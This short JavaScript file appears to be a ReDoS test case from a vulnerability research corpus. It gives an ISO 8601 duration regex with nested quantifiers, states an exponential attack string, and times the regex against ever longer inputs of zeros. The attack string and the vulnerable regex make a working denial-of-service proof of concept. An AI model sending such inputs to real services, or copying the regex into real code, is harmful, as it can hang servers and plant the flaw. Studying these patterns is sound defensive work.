/* 5270
 * ^[-]?P(?!$)(?:(?<year>\d+)+Y)?(?:(?<month>\d+)+M)?(?:(?<days>\d+)+D)?(?:T(?!$)(?:(?<hours>\d+)+H)?(?:(?<minutes>\d+)+M)? (?:(?<seconds>\d+(?:\.\d+)?)+S)?)?$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"PT "+"0"*32+"!1 __NQ"
 */
var REGEX = /^[-]?P(?!$)(?:(?<year>\d+)+Y)?(?:(?<month>\d+)+M)?(?:(?<days>\d+)+D)?(?:T(?!$)(?:(?<hours>\d+)+H)?(?:(?<minutes>\d+)+M)? (?:(?<seconds>\d+(?:\.\d+)?)+S)?)?$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'PT ' + '0'.repeat(i*1) + '!1 __NQ'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}